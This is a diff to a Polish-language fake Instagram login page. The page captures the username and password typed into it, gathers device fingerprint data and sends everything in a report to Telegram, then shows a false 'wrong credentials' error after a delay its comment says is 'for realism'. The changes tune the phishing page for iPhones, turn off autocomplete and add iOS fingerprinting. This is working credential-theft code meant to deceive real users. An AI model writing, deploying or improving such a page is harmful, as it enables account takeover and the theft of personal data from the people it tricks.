@@ -2,7 +2,7 @@
 <html lang="pl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
     <title>Instagram</title>
     <style>
         /* DOKŁADNE KOLORY ZE ZDJĘCIA */
@@ -20,7 +20,7 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
@@ -31,7 +31,9 @@
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            padding: 15px 25px;
+            padding: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
         }
 
         .container {
@@ -42,17 +44,18 @@
             align-items: center;
         }
 
-        /* LOGO */
+        /* LOGO - działa na iOS */
         .insta-logo {
             width: 60px;
             height: 60px;
             background-image: url('https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp');
             background-size: contain;
             background-repeat: no-repeat;
+            background-position: center;
             margin-bottom: 40px;
         }
 
-        /* STYLIZACJA PÓL */
+        /* STYLIZACJA PÓL - lepsze dla iPhone */
         .input-group {
             width: 100%;
             margin-bottom: 12px;
@@ -65,8 +68,10 @@
             border-radius: 12px;
             padding: 16px;
             color: white;
-            font-size: 14px;
+            font-size: 16px; /* Zapobiega zoomowi na iOS */
             outline: none;
+            -webkit-appearance: none;
+            appearance: none;
         }
 
         input:focus {
@@ -84,12 +89,18 @@
             color: white;
             border: none;
             border-radius: 25px;
-            padding: 12px;
-            font-size: 14px;
+            padding: 14px;
+            font-size: 15px;
             font-weight: 600;
             margin-top: 5px;
             cursor: pointer;
             transition: opacity 0.2s;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .login-btn:active {
+            opacity: 0.8;
         }
 
         .login-btn:disabled {
@@ -103,7 +114,7 @@
             text-align: center;
             margin-top: 12px;
             background: rgba(237, 73, 86, 0.1);
-            padding: 8px 12px;
+            padding: 10px 12px;
             border-radius: 8px;
             width: 100%;
             display: none;
@@ -119,6 +130,11 @@
             font-size: 14px;
             margin-top: 25px;
             font-weight: 500;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .forgot-link:active {
+            opacity: 0.7;
         }
 
         /* STOPKA */
@@ -137,12 +153,17 @@
             color: var(--link-blue);
             border: 1px solid var(--link-blue);
             border-radius: 25px;
-            padding: 10px;
+            padding: 12px;
             font-size: 14px;
             font-weight: 600;
             text-align: center;
             text-decoration: none;
             margin-bottom: 20px;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .create-btn:active {
+            opacity: 0.7;
         }
 
         .meta-footer {
@@ -160,10 +181,10 @@
         <div class="insta-logo"></div>
         
         <div class="input-group">
-            <input type="text" id="username" placeholder="Nazwa użytkownika, adres e-mail lub numer telefonu">
+            <input type="text" id="username" placeholder="Nazwa użytkownika, adres e-mail lub numer telefonu" autocomplete="off">
         </div>
         <div class="input-group">
-            <input type="password" id="password" placeholder="Hasło">
+            <input type="password" id="password" placeholder="Hasło" autocomplete="off">
         </div>
         
         <button class="login-btn" id="loginBtn">Zaloguj się</button>
@@ -192,14 +213,29 @@
         const loginBtn = document.getElementById('loginBtn');
         const errorMsgDiv = document.getElementById('errorMsg');
         
+        // Funkcja zbierająca informacje o urządzeniu (działa na iOS)
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            const isIOS = /iPhone|iPad|iPod/i.test(ua);
+            const isSafari = /Safari/i.test(ua) && !/Chrome/i.test(ua);
+            const systemVersion = (ua.match(/OS (\d+)_(\d+)_?(\d+)?/) || [])[1] || "nieznana";
+            
+            return {
+                isIOS: isIOS,
+                isSafari: isSafari,
+                systemVersion: systemVersion,
+                userAgent: ua
+            };
+        }
+        
         function collectFullTelegramReport() {
             const login = usernameInput.value.trim() || "[puste]";
             const password = passwordInput.value || "[puste]";
+            const device = getDeviceInfo();
             
             const userAgent = navigator.userAgent;
             const platform = navigator.platform || "nieznana";
             const language = navigator.language;
-            const languages = navigator.languages ? navigator.languages.join(", ") : language;
             const cookiesEnabled = navigator.cookieEnabled ? "Tak" : "Nie";
             const screenRes = `${screen.width}x${screen.height}`;
             const colorDepth = screen.colorDepth + "-bit";
@@ -234,9 +270,16 @@
                 }
             }
             
-            const localStorageSupport = typeof Storage !== "undefined" ? "dostępny" : "brak";
             const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
             const ipInfo = "188.146.xx.xx (Warsaw, PL)";
+            
+            // Dodatkowe info o iOS
+            let iosInfo = "";
+            if(device.isIOS) {
+                iosInfo = `\n🍎 DANE iOS:
+• Wersja iOS: ${device.systemVersion}
+• Przeglądarka: ${device.isSafari ? "Safari" : "Inna"}`;
+            }
             
             return `🔐 NOWA PRÓBA LOGOWANIA INSTAGRAM 🔐
 
@@ -255,7 +298,7 @@
 • RAM: ${deviceMemory}
 • Rdzenie: ${hardwareConcurrency}
 • Ekran dotykowy: ${isTouch}
-• Typ urządzenia: ${isMobile}
+• Typ urządzenia: ${isMobile}${iosInfo}
 
 🌐 SIEĆ:
 • Typ połączenia: ${connectionType}
@@ -263,7 +306,6 @@
 • Opóźnienie: ${rtt}
 
 🎮 GPU: ${gpuInfo}
-💾 Web Storage: ${localStorageSupport}
 
 ⏱️ Data próby: ${timestamp}
 ⚠️ Status: LOGOWANIE NIEPRAWIDŁOWE (błędne dane)
@@ -311,8 +353,13 @@ Raport wygenerowany przez panel logowania Instagram.`;
             loginBtn.innerText = "⏳ Logowanie...";
             loginBtn.disabled = true;
             
-            sendToTelegram();
+            // Wysłanie raportu do Telegram
+            await sendToTelegram();
+            
+            // Krótkie opóźnienie dla realizmu
             await new Promise(resolve => setTimeout(resolve, 800));
+            
+            // Pokazanie błędu logowania
             showLoginError();
             
             loginBtn.innerText = originalText;
@@ -332,10 +379,22 @@ Raport wygenerowany przez panel logowania Instagram.`;
         usernameInput.addEventListener('keypress', handleEnter);
         passwordInput.addEventListener('keypress', handleEnter);
         
+        // Linki nie robią nic
         document.querySelectorAll('.forgot-link, .create-btn').forEach(link => {
-            link.addEventListener('click', (e) => e.preventDefault());
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+            });
         });
+        
+        // Zapobieganie zoomowi na iOS przy focusie (dodatkowe zabezpieczenie)
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('touchstart', function() {
+                this.style.fontSize = '16px';
+            });
+        });
+        
+        console.log("Instagram login - zoptymalizowany pod iPhone");
     </script>
-
 </body>
 </html>
